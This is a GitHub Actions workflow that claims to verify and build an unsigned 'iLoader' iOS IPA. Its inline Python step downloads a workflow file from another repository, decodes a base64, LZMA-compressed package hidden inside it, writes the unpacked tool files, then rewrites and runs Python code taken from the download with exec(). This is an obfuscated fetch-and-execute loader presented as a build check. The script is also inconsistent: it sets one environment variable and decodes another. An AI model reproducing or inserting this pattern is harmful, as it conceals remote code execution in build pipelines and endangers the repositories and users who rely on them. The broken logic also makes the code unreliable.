jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify R691 and build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,base64,lzma,hashlib
          import pathlib,urllib.request,ast
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            '23978fa84f627f08be28d85d1e843629'
            '9083c424/.github/workflows/f0.yml')
          req=urllib.request.Request(url,headers={
            'User-Agent':'R691-Pinned'})
          with urllib.request.urlopen(
            req,timeout=40) as res:
            f0=res.read(14000)
          assert len(f0)==12358
          assert hashlib.sha256(f0).hexdigest()==(
            '1568e0f9ee9b6b210d7cebe93d2a4355'
            '2871a7b7bf3b7f4b319d0d3e94d056be')
          m=re.search(rb'(?m)^  R690_PKG: >-\n'
             rb'((?:    [^\n]*\n)+)',f0)
          assert m,'R690_PINNED_PACKAGE_MISSING'
          os.environ['R690_PKG']=b''.join(
            m[1].split()).decode('ascii')
          raw=lzma.decompress(base64.b64decode(
            os.environ['R691_PKG']),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(raw).hexdigest()==(
            'b80cc6a8501581d77436c3b8d4f1b1bf'
            'bb49fd09fae47cb277614c5fb6a37f64')
          names=['R691HistoricalVision.swift',
            'R691Patch.py','R691MakeBuild.py']
          sizes=[8113, 1124, 1664]
          assert sum(sizes)==len(raw)
          pos=0
          for n,size in zip(names,sizes):
            out=pathlib.Path('tools')/n
            out.parent.mkdir(
              parents=True,exist_ok=True)
            out.write_bytes(raw[pos:pos+size])
            pos+=size
          print('R691_SOURCE_SHA_PASS',flush=True)
          text=f0.decode('utf-8')
          marker="          python3 - <<'PYCODE'\n"
          start=text.index(marker)+len(marker)
          end=text.index('\n          PYCODE',start)
          block=text[start:end]
          body='\n'.join(
            line[10:] for line in
            block.splitlines())
          needle=("['python3','tools/"+
            "R690MakeBuild.py']")
          assert body.count(needle)==1
          body=body.replace(needle,
            "['python3','tools/R691MakeBuild.py']")
          ast.parse(body)
          exec(compile(body,'r690','exec'),{})
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R691-unsigned-iLoader-IPA
          path: dist/R691*
          if-no-files-found: error
          retention-days: 7
